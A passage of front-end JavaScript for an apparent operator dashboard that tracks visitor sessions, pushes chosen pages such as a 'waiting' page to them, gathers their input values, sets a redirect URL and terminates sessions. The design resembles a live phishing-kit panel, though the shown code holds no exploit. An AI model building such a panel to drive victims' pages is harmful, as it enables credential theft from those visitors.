        logErrorToServer(error);
        return;
    }
    
    if (grid.innerHTML === '') {
        grid.innerHTML = '<div class="p-4 text-center">Loading input panels...</div>';
    }
    
    try {
        const dynamicPanels = Array.from(grid.children).filter(child => 
            !child.classList.contains('collapsible-section-fixed'));
        
        const openStates = {};
        dynamicPanels.forEach(panel => {
            const sectionId = panel.id;
            openStates[sectionId] = panel.classList.contains('open');
        });
        
        state.openSections = state.openSections || {};
        state.openSections[sessionId] = openStates;
        
        dynamicPanels.forEach(panel => grid.removeChild(panel));
        
        const config = await fetchConfiguration();
        const configPanels = {};
        for (const pageKey in config.pages) {
            const page = config.pages[pageKey];
            if (page.panel && page.panel.input) {
                configPanels[page.panel.input.name] = {
                    ...page.panel.input,
                    pageKey: pageKey
                };
            }
        }
        
        const sessionData = state.sessionData && state.sessionData[sessionId] ? 
                            state.sessionData[sessionId] : {};
        
        
        if (grid.innerHTML.includes('Loading input panels...')) {
            grid.innerHTML = '';
        }
        
        if (Object.keys(configPanels).length === 0 && Object.keys(sessionData).length === 0) {
            grid.innerHTML = '<div class="p-4 text-center">No input panels configured for this session.</div>';
            return;
        }
        
        for (const inputName in configPanels) {
            const configData = configPanels[inputName];
            const realData = sessionData[inputName];
            
            if (!configData.values || configData.values.length === 0 || realData) continue;
            
            const sectionId = inputName.toLowerCase().replace(/ /g, '-');
            const pageKey = configData.pageKey;
                
            renderInputPanel(grid, sectionId, sessionId, configData, null, pageKey);
        }
        
        for (const inputName in sessionData) {
            const realData = sessionData[inputName];
            const configData = configPanels[inputName];
            
            if (!realData || !realData.values || realData.values.length === 0) continue;
            
            const combinedData = {
                ...configData,
                ...realData,
                values: realData.values || (configData ? configData.values : [])
            };
            const sectionId = inputName.toLowerCase().replace(/ /g, '-');
            const pageKey = configData ? configData.pageKey : 
                            Object.keys(config.pages).find(key => 
                                config.pages[key].panel?.input?.name === inputName);
            
            renderInputPanel(grid, sectionId, sessionId, configData, realData, pageKey);
        }
        
        renderAvailablePages();
        
    } catch (error) {
        logErrorToServer(error);
        grid.innerHTML = `<div class="p-4 text-center text-status-error-light dark:text-status-error-dark">
                            Error loading input panels: ${error.message}
                          </div>`;
    }
  }

let isResizing = false;
let resizeDirection = '';

function makeSessionManagerResizable() {
  const modal = document.getElementById('sessionManager');
  const minWidth = 400;
  const minHeight = 300;
  
  const directions = ['n', 'e', 's', 'w', 'ne', 'se', 'sw', 'nw'];
  
  const style = document.createElement('style');
  style.textContent = `
    .resize-handle {
      position: absolute;
      z-index: 100;
      background-color: transparent;
    }
    .resize-handle.n {
      top: -5px;
      left: 0;
      right: 0;
      height: 10px;
      cursor: ns-resize;
    }
    .resize-handle.e {
      top: 0;
      right: -5px;
      bottom: 0;
      width: 10px;
      cursor: ew-resize;
    }
    .resize-handle.s {
      bottom: -5px;
      left: 0;
      right: 0;
      height: 10px;
      cursor: ns-resize;
    }
    .resize-handle.w {
      top: 0;
      left: -5px;
      bottom: 0;
      width: 10px;
      cursor: ew-resize;
    }
    .resize-handle.ne {
      top: -5px;
      right: -5px;
      width: 15px;
      height: 15px;
      cursor: nesw-resize;
    }
    .resize-handle.se {
      bottom: -5px;
      right: -5px;
      width: 15px;
      height: 15px;
      cursor: nwse-resize;
    }
    .resize-handle.sw {
      bottom: -5px;
      left: -5px;
      width: 15px;
      height: 15px;
      cursor: nesw-resize;
    }
    .resize-handle.nw {
      top: -5px;
      left: -5px;
      width: 15px;
      height: 15px;
      cursor: nwse-resize;
    }
    
    #sessionManager {
      overflow: auto;
      resize: none; /* Disable browser's native resize */
    }
  `;
  document.head.appendChild(style);
  
  modal.querySelectorAll('.resize-handle').forEach(handle => handle.remove());
  
  directions.forEach(dir => {
    const handle = document.createElement('div');
    handle.className = `resize-handle ${dir}`;
    handle.dataset.direction = dir;
    modal.appendChild(handle);
    
    handle.addEventListener('mousedown', startResize);
  });

  socket.on('config_updated', function(data) {
      if (data.section === 'options') {
        if (data.key === 'redirectURL') {
          state.redirectURL = data.value;
          
          const redirectInput = document.getElementById('redirectURL');
          if (redirectInput) {
            redirectInput.value = data.value;
          }
          
          setCookie("redirectURL", data.value, 365);
        }
        
        if (data.key === 'mobile_only') {
          state.mobile_only = data.value === true;
          
          const phoneButton = document.getElementById('phoneButton');
          const svg = phoneButton.querySelector('svg');
          const indicator = document.getElementById('phoneButtonIndicator');
          
          if (data.value === true) {
            svg.innerHTML = '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12.667 8 10 12h4l-2.667 4"/>';
            svg.classList.add('lucide-smartphone-charging');
            svg.classList.add('lucide-smartphone-charging-icon');
            indicator.classList.remove('hidden');
          } else {
            svg.innerHTML = '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line>';
            svg.classList.remove('lucide-smartphone-charging');
            svg.classList.remove('lucide-smartphone-charging-icon');
            indicator.classList.add('hidden');
          }
        }
      }
    });

  socket.on('redirect_url_update_response', function(data) {
    if (data.status === 'success') {
      state.redirectURL = data.redirectURL;
      
      const redirectInput = document.getElementById('redirectURL');
      if (redirectInput) {
        redirectInput.value = data.redirectURL;
      }
      
      setCookie("redirectURL", data.redirectURL, 365);
      
      showToast(data.message, 'success');
    } else {
      showToast(`Error updating redirect URL: ${data.message}`, 'error');
    }
  });


  socket.on('redirect_url_response', function(data) {
    if (data.redirectURL) {
      state.redirectURL = data.redirectURL;
      
      const redirectInput = document.getElementById('redirectURL');
      if (redirectInput) {
        redirectInput.value = data.redirectURL;
      }
      
      setCookie("redirectURL", data.redirectURL, 365);
    }
  });


  function update_redirect_url(url) {
    socket.emit('update_redirect_url', {
      redirectURL: url
    });
  }
  
  
  function startResize(e) {
    e.preventDefault();
    e.stopPropagation();
    
    modal.style.transition = 'none';
    
    isResizing = true;
    resizeDirection = e.target.dataset.direction;
    
    const rect = modal.getBoundingClientRect();
    modal.style.transform = 'none';
    modal.style.left = rect.left + 'px';
    modal.style.top = rect.top + 'px';
    
    startX = e.clientX;
    startY = e.clientY;
    startWidth = parseInt(window.getComputedStyle(modal).width, 10);
    startHeight = parseInt(window.getComputedStyle(modal).height, 10);
    initialLeft = parseInt(modal.style.left, 10) || rect.left;
    initialTop = parseInt(modal.style.top, 10) || rect.top;
    
    document.addEventListener('mousemove', resize);
    document.addEventListener('mouseup', stopResize);
  }
  
  function resize(e) {
    if (!isResizing) return;
    
    const deltaX = e.clientX - startX;
    const deltaY = e.clientY - startY;
    
    let newWidth = startWidth;
    let newHeight = startHeight;
    let newLeft = initialLeft;
    let newTop = initialTop;
    
    if (resizeDirection.includes('e')) {
      newWidth = startWidth + deltaX;
    } else if (resizeDirection.includes('w')) {
      newWidth = startWidth - deltaX;
      if (newWidth >= minWidth) {
        newLeft = initialLeft + deltaX;
      }
    }
    
    if (resizeDirection.includes('s')) {
      newHeight = startHeight + deltaY;
    } else if (resizeDirection.includes('n')) {
      newHeight = startHeight - deltaY;
      if (newHeight >= minHeight) {
        newTop = initialTop + deltaY;
      }
    }
    
    if (newWidth >= minWidth) {
      modal.style.width = newWidth + 'px';
      modal.style.left = newLeft + 'px';
    }
    
    if (newHeight >= minHeight) {
      modal.style.height = newHeight + 'px';
      modal.style.top = newTop + 'px';
    }
  }
  
  function stopResize() {
    isResizing = false;
    modal.style.transition = '';
    document.removeEventListener('mousemove', resize);
    document.removeEventListener('mouseup', stopResize);
  }
}

function manageSession(sessionId) {
  const session = state.sessions.find(s => s.id === sessionId);
  if (session) {
      state.selectedSession = session;
      state.sessionManagerVisible = true;
      sessionManager.style.display = 'block';

      sessionManager.style.position = 'fixed';
      sessionManager.style.top = '50%';
      sessionManager.style.left = '50%';
      sessionManager.style.transform = 'translate(-50%, -50%)';

      sessionManager.style.setProperty('position', 'fixed', 'important');
      sessionManager.style.setProperty('top', '50%', 'important');
      sessionManager.style.setProperty('left', '50%', 'important');
      sessionManager.style.setProperty('transform', 'translate(-50%, -50%)', 'important');
      
      if (!sessionManager.style.width) {
          sessionManager.style.width = '800px';
      }
      
      if (!sessionManager.style.height) {
          sessionManager.style.height = '600px';
      }
      
      if (!sessionManager.classList.contains('resizable-initialized')) {
          makeSessionManagerResizable();
          sessionManager.classList.add('resizable-initialized');
      }

      updateSessionManager();
      updateConnectionDetails();
      updateActivityLog(); 
      
      const waitingRoute = state.config?.waiting; 
      let waitingPage = null;

      if (waitingRoute) {
          waitingPage = state.availablePages.find(page => page.route === waitingRoute);
      } else {
          waitingPage = state.availablePages.find(page => page.id === 'waiting'); 
      }
      
      if (waitingPage) {
          selectPage(waitingPage.id);
      } else if (state.availablePages.length === 0) {
          fetchAvailablePages();
          setTimeout(() => {
              let refetchedWaitingPage = null;
              if (waitingRoute) {
                 refetchedWaitingPage = state.availablePages.find(page => page.route === waitingRoute);
              }
              if (!refetchedWaitingPage) {
                 refetchedWaitingPage = state.availablePages.find(page => page.id === 'waiting');
              }

              if (refetchedWaitingPage) {
                  selectPage(refetchedWaitingPage.id);
              } else {
                  if(state.availablePages.length > 0) {
                      selectPage(state.availablePages[0].id);
                  } else {
                      showToast("Could not load any pages.", "error");
                  }
              }
          }, 500);
      } else {
           if(state.availablePages.length > 0) {
               selectPage(state.availablePages[0].id);
           } else {
                showToast("No suitable waiting page found.", "error");
           }
      }
      
      renderSessionInputData(sessionId).catch(err => {
          logErrorToServer(error);
          showToast('Error loading input panels', 'error');
      });
      
      socket.emit('request_session_data', { session_id: sessionId });
  }
}

  sessionsTable.addEventListener('click', function(e) {
    const btn = e.target.closest('.session-actions-btn');
    if (btn) {
      e.stopPropagation();
      manageSession(btn.getAttribute('data-session-id'));
    }
  });

  function getOsIcon(os) {
    switch(os.toLowerCase()){
      case 'windows':
        return `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 48 48">
    <path fill="#00b0ff" d="M20 25.026L5.011 25 5.012 37.744 20 39.818zM22 25.03L22 40.095 42.995 43 43 25.066zM20 8.256L5 10.38 5.014 23 20 23zM22 7.973L22 23 42.995 23 42.995 5z"></path>
  </svg>`;
      case 'macos':
        return `<svg fill="#838383" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" stroke="#838383" width="24" height="24">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.09997 22C7.78997 22.05 6.79997 20.68 5.95997 19.47C4.24997 17 2.93997 12.45 4.69997 9.39C5.56997 7.87 7.12997 6.91 8.81997 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z"></path>
    </g>
  </svg>`;
      case 'linux':
        return `<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none" width="24" height="24">
      <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
      <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
      <g id="SVGRepo_iconCarrier">
        <path fill="#202020" d="M13.338 12.033c-.1-.112-.146-.319-.197-.54-.05-.22-.107-.457-.288-.61v-.001a.756.756 0 00-.223-.134c.252-.745.153-1.487-.1-2.157-.312-.823-.855-1.54-1.27-2.03-.464-.586-.918-1.142-.91-1.963.014-1.254.138-3.579-2.068-3.582-.09 0-.183.004-.28.012-2.466.198-1.812 2.803-1.849 3.675-.045.638-.174 1.14-.613 1.764-.515.613-1.24 1.604-1.584 2.637-.162.487-.24.984-.168 1.454-.023.02-.044.041-.064.063-.151.161-.263.357-.388.489-.116.116-.282.16-.464.225-.183.066-.383.162-.504.395v.001a.702.702 0 00-.077.339c0 .108.016.217.032.322.034.22.068.427.023.567-.144.395-.163.667-.061.865.102.199.31.286.547.335.473.1 1.114.075 1.619.342l.043-.082-.043.082c.54.283 1.089.383 1.526.284a.99.99 0 00.706-.552c.342-.002.717-.146 1.318-.18.408-.032.918.145 1.503.113a.806.806 0 00.068.183l.001.001c.227.455.65.662 1.1.627.45-.036.928-.301 1.315-.762l-.07-.06.07.06c.37-.448.982-.633 1.388-.878.203-.123.368-.276.38-.499.013-.222-.118-.471-.418-.805z"></path>
        <path fill="#F8BF11" d="M13.571 12.828c-.007.137-.107.24-.29.35-.368.222-1.019.414-1.434.918-.362.43-.802.665-1.19.696-.387.03-.721-.13-.919-.526v-.002c-.123-.233-.072-.6.031-.987s.251-.785.271-1.108v-.001c.02-.415.044-.776.114-1.055.07-.28.179-.468.373-.575a.876.876 0 01.027-.014c.022.359.2.725.514.804.343.09.838-.204 1.047-.445l.122-.004c.184-.005.337.006.495.143v.001c.121.102.179.296.229.512.05.217.09.453.239.621.287.32.38.534.371.672zM6.592 13.843v.003c-.034.435-.28.672-.656.758-.377.086-.888 0-1.398-.266-.565-.3-1.237-.27-1.667-.36-.216-.045-.357-.113-.421-.238-.064-.126-.066-.345.071-.72v-.001l.001-.002c.068-.209.018-.438-.015-.653-.033-.214-.049-.41.024-.546l.001-.001c.094-.181.232-.246.403-.307.17-.062.373-.11.533-.27l.001-.001h.001c.148-.157.26-.353.39-.492.11-.117.22-.195.385-.196h.005a.61.61 0 01.093.008c.22.033.411.187.596.437l.533.971v.001c.142.296.441.622.695.954.254.333.45.666.425.921z"></path>
        <path fill="#D6A312" d="M9.25 4.788c-.043-.084-.13-.164-.28-.225-.31-.133-.444-.142-.617-.254-.28-.181-.513-.244-.706-.244a.834.834 0 00-.272.047c-.236.08-.392.25-.49.342-.02.019-.044.035-.104.08-.06.043-.15.11-.28.208-.117.086-.154.2-.114.332.04.132.167.285.4.417h.001c.145.085.244.2.358.291a.801.801 0 00.189.117c.072.031.156.052.26.058.248.015.43-.06.59-.151.16-.092.296-.204.452-.255h.001c.32-.1.548-.301.62-.493a.324.324 0 00-.008-.27z"></path>
        <path fill="#202020" d="M8.438 5.26c-.255.133-.552.294-.869.294-.316 0-.566-.146-.745-.289-.09-.07-.163-.142-.218-.193-.096-.075-.084-.181-.045-.178.066.008.076.095.117.134.056.052.126.12.211.187.17.135.397.266.68.266.284 0 .614-.166.816-.28.115-.064.26-.179.379-.266.09-.067.087-.147.162-.138.075.009.02.089-.085.18-.105.092-.27.214-.403.283z"></path>
        <path fill="#ffffff" d="M12.337 10.694a1.724 1.724 0 00-.104 0h-.01c.088-.277-.106-.48-.621-.713-.534-.235-.96-.212-1.032.265-.005.025-.009.05-.011.076a.801.801 0 00-.12.054c-.252.137-.389.386-.465.692-.076.305-.098.674-.119 1.09-.013.208-.099.49-.186.79-.875.624-2.09.894-3.122.19-.07-.11-.15-.22-.233-.328a13.85 13.85 0 00-.16-.205.65.65 0 00.268-.05.34.34 0 00.186-.192c.063-.17 0-.408-.202-.68-.201-.273-.542-.58-1.043-.888-.368-.23-.574-.51-.67-.814-.097-.305-.084-.635-.01-.96.143-.625.51-1.233.743-1.614.063-.046.023.086-.236.567-.232.44-.667 1.455-.072 2.248.016-.564.15-1.14.377-1.677.329-.747 1.018-2.041 1.072-3.073.029.02.125.086.169.11.126.075.221.184.344.283a.85.85 0 00.575.2c.24 0 .427-.079.582-.168.17-.096.304-.204.433-.245.27-.085.486-.235.608-.41.21.83.7 2.027 1.014 2.611.167.31.5.969.643 1.762.091-.002.191.01.299.038.375-.973-.319-2.022-.636-2.314-.128-.124-.135-.18-.07-.177.343.304.795.917.96 1.608.075.315.09.646.01.973.04.017.08.034.12.054.603.293.826.548.719.897z"></path>
      </g>
  </svg>`;
      default:
        return `<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000">
    <circle cx="12" cy="12" r="10"/>
  </svg>`;
    }
  }
  
  function getBrowserIcon(browser) {
    switch (browser.toLowerCase()){
      case 'chrome':
        return `<svg viewBox="0 0 32 32" width="24" height="24" data-name="Layer 1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <path d="M4.7434,22.505A12.9769,12.9769,0,0,0,14.88,28.949l5.8848-10.1927L16,16.0058,11.2385,18.755l-1.5875-2.75L8.4885,13.9919,5.3553,8.5649A12.9894,12.9894,0,0,0,4.7434,22.505Z" fill="#00ac47"></path>
      <path d="M16,3.0072A12.9769,12.9769,0,0,0,5.3507,8.5636l5.8848,10.1927L16,16.0057V10.5072H27.766A12.99,12.99,0,0,0,16,3.0072Z" fill="#ea4435"></path>
      <path d="M27.2557,22.505a12.9772,12.9772,0,0,0,.5124-12H15.9986v5.5011l4.7619,2.7492-1.5875,2.75-1.1625,2.0135-3.1333,5.4269A12.99,12.99,0,0,0,27.2557,22.505Z" fill="#ffba00"></path>
      <circle cx="16" cy="16" fill="#ffffff" r="5.5"></circle>
      <circle cx="16" cy="16" fill="#4285f4" r="4.25"></circle>
    </g>
  </svg>`;
  case 'firefox':
    return `<svg viewBox="0 -2.5 48 48" width="24" height="24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#FF8000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <title>firefox-color</title>
      <desc>Created with Sketch.</desc>
      <defs></defs>
      <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Color-" transform="translate(-301.000000, -1045.000000)" fill="#FF8000">
          <path d="M317.687745,1052.7291 C317.875434,1051.14046 318.943782,1049.07983 320.955235,1048.13538 C317.933104,1047.67735 315.478934,1049.07994 314.256567,1050.88304 C312.316998,1050.46821 311.125272,1050.44546 309.174751,1050.80671 C307.937006,1049.87681 306.481397,1047.75773 306.595338,1045.54038 C304.253478,1048.27477 303.770916,1050.33667 304.059615,1052.79817 C295.046,1068.78088 307.172968,1088 324.458413,1088 C339.988016,1087.99988 349,1076.22702 349,1064.16348 C349,1056.02799 345.285016,1048.96607 341.491975,1047.43922 C342.907157,1048.98525 344.514921,1053.01228 344.206882,1055.79898 C341.14549,1047.89736 333.501504,1044.84353 330.925586,1045.00614 C339.393376,1048.27904 341.419858,1059.42054 340.668636,1062.7088 C339.932443,1058.85292 337.583244,1055.53174 336.177848,1054.65381 C344.378727,1073.69855 324.572937,1079.54993 318.529841,1072.94037 C320.088207,1073.341 323.164396,1073.14409 325.468974,1071.61424 C327.625009,1070.18301 327.827844,1070.09905 329.213084,1069.99245 C330.858479,1069.86565 329.113939,1066.64495 325.519654,1067.18981 C324.040744,1067.41409 321.6037,1069.13796 318.606152,1068.0018 C314.989265,1066.63074 315.10309,1061.73663 318.837996,1063.20909 C319.646422,1062.16936 319.049685,1060.204 319.049685,1060.204 C320.134809,1059.21901 321.504671,1058.52494 322.339077,1058.03712 C322.886299,1057.71722 324.328627,1056.83155 324.246957,1055.10941 C323.953132,1054.88167 323.478259,1054.59064 322.40863,1054.6515 C318.240677,1054.91343 317.961997,1053.42064 317.687745,1052.7291 Z"></path>
        </g>
      </g>
    </g>
  </svg>`;
  
      case 'safari':
        return `<svg viewBox="0 0 48 48" width="24" height="24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#000000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <title>Safari-color</title>
      <desc>Created with Sketch.</desc>
      <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Color-" transform="translate(-700.000000, -1043.000000)">
          <g id="Safari" transform="translate(700.000000, 1043.000000)">
            <circle id="Oval" fill="#00ABFF" cx="24" cy="24" r="24"></circle>
            <g id="Group" transform="translate(24.388909, 24.176777) rotate(-45.000000) translate(-24.388909, -24.176777) translate(2.888909, 20.676777)">
              <g id="Group-2">
                <polygon id="Shape" fill="#FFFFFF" points="0 3.1 21.35 6.2 22.2921646 0.731192283"></polygon>
                <polygon id="Shape" fill="#EE0000" points="42.7 3.1 21.35 6.2 21.35 2.4901204"></polygon>
                <polygon id="Shape" fill="#FFFFFF" points="0 3.1 21.35 0 21.35 3.1"></polygon>
                <polygon id="Shape" fill="#EE0000" points="21.35 0 42.7 3.1 21.35 3.1"></polygon>
              </g>
            </g>
          </g>
        </g>
      </g>
    </g>
  </svg>`;
      case 'edge':
        return `<svg viewBox="-41.95 0 1083.89 1083.89" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#000000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <path fill="#3277BC" d="M316.997 436.854h383.437c0-136.13-59.4-228.94-221.36-228.94C287.674 207.913 93.033 332.514.5 487.876 29.162 218.213 222.513.5 513.607.5 763.109.5 999.5 191.264 999.5 508.374v120.563H319.04c0 164.094 143.148 229.11 293.07 229.11 182.448 0 295.435-81.985 295.435-81.985v229.852s-127.548 77.477-330.852 77.477c-264.197 0-450.687-189.34-450.687-424.789 0-184.808 111.788-332.36 266.628-393.245-75.372 82.777-75.638 171.497-75.638 171.497z"></path>
    </g>
  </svg>`;
      case 'opera':
        return `<svg viewBox="0 0 32 32" width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <path d="M11.3953 23.8859C9.84219 22.0594 8.84688 19.3578 8.78125 16.3281V15.6719C8.84688 12.6422 9.85313 9.94063 11.3953 8.11406C13.4078 5.51094 16.3609 4.34063 19.6969 4.34063C21.7531 4.34063 23.6891 4.48281 25.3297 5.57656C22.8687 3.35625 19.6203 2.01094 16.0547 2H16C8.26719 2 2 8.26719 2 16C2 23.5031 7.90625 29.6391 15.3328 29.9891C15.5516 30 15.7812 30 16 30C19.5875 30 22.8578 28.6547 25.3297 26.4344C23.6891 27.5281 21.8625 27.5719 19.8062 27.5719C16.4813 27.5828 13.3969 26.5 11.3953 23.8859Z" fill="url(#paint0_linear_87_7112)"></path>
      <path d="M11.3955 8.11426C12.6752 6.59395 14.3377 5.68613 16.1533 5.68613C20.233 5.68613 23.5361 10.3018 23.5361 16.0111C23.5361 21.7205 20.233 26.3361 16.1533 26.3361C14.3377 26.3361 12.6861 25.4174 11.3955 23.908C13.408 26.5111 16.3939 28.1736 19.7189 28.1736C21.7643 28.1736 23.6893 27.5502 25.3299 26.4564C28.1955 23.8752 30.0002 20.1455 30.0002 16.0002C30.0002 11.8549 28.1955 8.1252 25.3299 5.56582C23.6893 4.47207 21.7752 3.84863 19.7189 3.84863C16.383 3.84863 13.3971 5.5002 11.3955 8.11426Z" fill="url(#paint1_linear_87_7112)"></path>
      <defs>
        <linearGradient id="paint0_linear_87_7112" x1="13.6655" y1="2.4564" x2="13.6655" y2="29.5926" gradientUnits="userSpaceOnUse">
          <stop offset="0.3" stop-color="#FF1B2D"></stop>
          <stop offset="0.4381" stop-color="#FA1A2C"></stop>
          <stop offset="0.5939" stop-color="#ED1528"></stop>
          <stop offset="0.7581" stop-color="#D60E21"></stop>
          <stop offset="0.9272" stop-color="#B70519"></stop>
          <stop offset="1" stop-color="#A70014"></stop>
        </linearGradient>
        <linearGradient id="paint1_linear_87_7112" x1="20.696" y1="4.05613" x2="20.696" y2="28.0566" gradientUnits="userSpaceOnUse">
          <stop stop-color="#9C0000"></stop>
          <stop offset="0.7" stop-color="#FF4B4B"></stop>
        </linearGradient>
      </defs>
    </g>
  </svg>`;
      case 'brave':
        return `<svg viewBox="0 0 100 100" width="24" height="24" xmlns="http://www.w3.org/2000/svg" version="1.1" fill="#000000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <g transform="scale(0.521)">
        <path style="fill:#F76F31;stroke:none;stroke-width:1;" d="m 66,14 60,0 14,16 10,-2 10,10 0,10 14,20 -18,70 a 20 20 0 0 1 -8,10 l -40,30 a 20 20 0 0 1 -24,0 l -40,-30 a 20 20 0 0 1 -8,-10 l -18,-70 14,-20 0,-10 10,-10 10,2 z"></path>
        <path style="fill:#FFF;stroke:none;" d="m 56,42 14,4 a 20 20 0 0 0 8,0 l 14,-4 a 20,20 0 0 1 8,0 l 14,4 a 20 20 0 0 0 8,0 l 14,-4 20,28 a 10 10 0 0 1 0,8 l -22,22 3,8 a 20 15 0 0 1 0,8 a 25 25 0 0 1 -8,8 a 8 8 0 0 1 -6,0 a 40 40 0 0 1 -20,-14 a 4 4 0 0 1 0,-4 l 12,-12 a 4 4 0 0 0 0,-4 l -4,-12 a 10 10 0 0 1 2,-7 a 40 40 0 0 1 24,-10 a 60 60 0 0 0 -30,6 l 4,24 a 40,40 0 0 1 -30,0 l 4,-24 a 60 60 0 0 0 -30,-6 a 40 40 0 0 1 24,10 a 10 10 0 0 1 2,7 l -4,12 a 4 4 0 0 0 0,4 l 12,12 a 4 4 0 0 1 0,4 a 40 40 0 0 1 -20,14 a 8 8 0 0 1 -6,0 a 25 25 0 0 1 -8,-8 a 20 15 0 0 1 0,-8 l 3,-8 -22,-22 a 10 10 0 0 1 0,-8 z"></path>
        <path style="fill:#FFF;stroke:none;" d="m 92,120 a 10 10 0 0 1 8,0 l 20,10 -24,20 -24,-20 z"></path>
      </g>
    </g>
  </svg>`;
      case 'opera gx':
        return `<svg viewBox="0 0 6260 6260" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fa1e4e" stroke="#fa1e4e">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <path d="M4874 5070a1839 1839 0 01-1015 310c-585 0-1140-286-1522-785l-4-5c-293-348-468-860-480-1400v-127c12-543 187-1054 484-1407 382-500 937-785 1522-785a1840 1840 0 011015 310 2629 2629 0 010 3890m-1867 670A2608 2608 0 01527 3125 2615 2615 0 013134 508h6a2540 2540 0 01668 90c-652 16-1265 340-1684 887-333 395-532 968-545 1576v133c13 604 210 1176 543 1570 423 552 1036 874 1687 890a2620 2620 0 01-803 87M5048 970a2866 2866 0 00-1917-736A2888 2888 0 00254 3126a2880 2880 0 002877 2894 2860 2860 0 001917-736 2904 2904 0 000-4313m-1390 333c513 330 867 1024 867 1826s-354 1495-867 1826c655-55 1175-850 1175-1826s-520-1770-1175-1826"></path>
    </g>
  </svg>`;
      case 'vivaldi':
        return `<svg viewBox="0 0 256 256" width="24" height="24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" fill="#000000">
    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
    <g id="SVGRepo_iconCarrier">
      <defs>
        <linearGradient x1="20.9848027%" y1="5.13176388%" x2="75.8463214%" y2="100.365967%" id="linearGradient-1">
          <stop offset="0" stop-color="#000000" stop-opacity="0.2"></stop>
          <stop offset="79%" stop-color="#000000" stop-opacity="0.05"></stop>
        </linearGradient>
      </defs>
      <g>
        <path d="M127.998933,255.998933 C184.090667,255.998933 215.2608,255.998933 235.629867,235.629867 C255.998933,215.2608 255.998933,184.090667 255.998933,127.998933 C255.998933,71.9080533 255.998933,40.7376 235.629867,20.3687467 C215.2608,0 184.090667,0 127.998933,0 C71.9080533,0 40.6990933,0 20.3688533,20.3687467 C0.03857632,40.7376 0,71.9080533 0,127.998933 C0,184.090667 0,215.2608 20.3688533,235.629867 C40.7376,255.998933 71.9080533,255.998933 127.998933,255.998933 Z" fill="#EF3939"></path>
        <path d="M211.221333,80.6334933l-86 59c-24 13-36 26-38 20-2-5 0-19-1-42l-1-380c0-4 3-10 7-9l44 13 63-10 43-30c5-3 11-3 15 1l37 36c3 4 4 11 2 15l-10 19 17 45-59 221c-9 26-22 33-33 42z" opacity=".07"></path>
      </g>
    </g>
  </svg>`;
      default:
        return `<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000">
    <circle cx="12" cy="12" r="10"/>
  </svg>`;
    }
  }

  function terminateSession(sessionId) {
    showToast(`Session terminated: ${sessionId}`, 'error');
    socket.emit('terminate_session', {
      session_id: sessionId
    });
  
    const index = state.sessions.findIndex(s => s.id === sessionId);
    if (index !== -1) {
      const terminated = state.sessions.splice(index, 1)[0];
      state.terminatedSessions.push(terminated);
    }
  
    addNotification({
      id: performance.timing.navigationStart + performance.now(),
      title: `Session`,
      message: `Session was terminated by admin.`,
      timestamp: Date.now(),
      unread: true,
    });  
    updateUI();
  }

  function closeSessionManagerModal() {
      state.sessionManagerVisible = false;
      state.selectedSession = null;
      state.selectedPage = null;
      state.showRequiredInfo = false;
      state.requiredInfoValue = '';
